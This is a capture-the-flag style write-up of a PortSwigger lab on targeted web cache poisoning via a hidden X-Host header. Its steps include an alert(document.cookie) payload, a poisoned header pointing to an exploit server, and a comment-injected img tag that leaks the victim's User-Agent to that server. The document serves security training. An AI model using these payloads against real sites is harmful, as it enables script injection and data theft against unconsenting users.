# Targeted web cache poisoning using an unknown header

## 📌 Lab Details
- **Title**: Targeted web cache poisoning using an unknown header
- **Difficulty**: Practitioner
- **Category**: Web Cache Poisoning
- **Lab URL**: https://portswigger.net/academy/labs/launch/d6f044fd123351c4a58cf52862ce204541864a727f83fca937a5ebe40542a162?referrer=%2fweb-security%2fweb-cache-poisoning%2fexploiting-design-flaws%2flab-web-cache-poisoning-targeted-using-an-unknown-header

## 🔍 Summary
This lab demonstrates a targeted web cache poisoning attack where a hidden HTTP header influences the response but is not included in the cache key. <br>
The application trusts a secret header (`X-Host`) to generate an absolute URL for a JavaScript resource. Because the response is cached, an attacker can poison the cache and force victims to load malicious JavaScript from an attacker-controlled domain. <br>
The challenge is complicated by the presence of a `Vary: User-Agent` header, meaning the cache is segmented by User-Agent. To successfully target the victim, we must first discover the victim's User-Agent and then poison the corresponding cache entry.

## 🛠 Steps to Solve
1. Find the `GET` request for the home page.
2. With the help of `Param Miner` extension find the hidden `X-Host` header.
3. Add the `X-Host` header with an arbitrary hostname, such as `example.com`. Notice that the value of this header is used to dynamically generate an absolute URL for importing the JavaScript file stored at `/resources/js/tracking.js`.
4. Go to the exploit server and change the file name to match the path used by the vulnerable response: `resouces/js/tracking.js`.
5. In the body, enter the payload `alert(document.cookie)` and store the exploit.
6. Go back to the request in Burp Repeater and set the `X-Host` header as follows, remembering to add your own exploit server ID: `X-Host: YOUR-EXPLOIT-SERVER-ID.exploit-server.net`
7. Send the request until you see your exploit server URL reflected in the response and `X-Cache: hit` in the headers.
8. To simulate the victim, load the URL in the browser and make sure that the `alert()` fires.
9. Notice that the `Vary` header is used to specify that the User-Agent is part of the cache key. To target the victim, you need to find out their `User-Agent`.
10. Post a comment with a payload: `<img src="https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/foo" />`
11. You will find the `User-Agent` of the victim in the **Access log** of the exploit server.
12. Send the new request with the updated `User-Agent` and replay the request to keep the cache poisoned until the victim visits the site and the lab is solved.


## 📖 Key Takeaways
- Hidden headers can influence responses even when not documented.
- Param Miner is extremely useful for discovering unkeyed inputs.
- The `Vary` header reveals which request components are included in the cache key.
- Cache poisoning can be targeted at specific groups of users rather than affecting everyone.

## 🖼️ Screenshot 
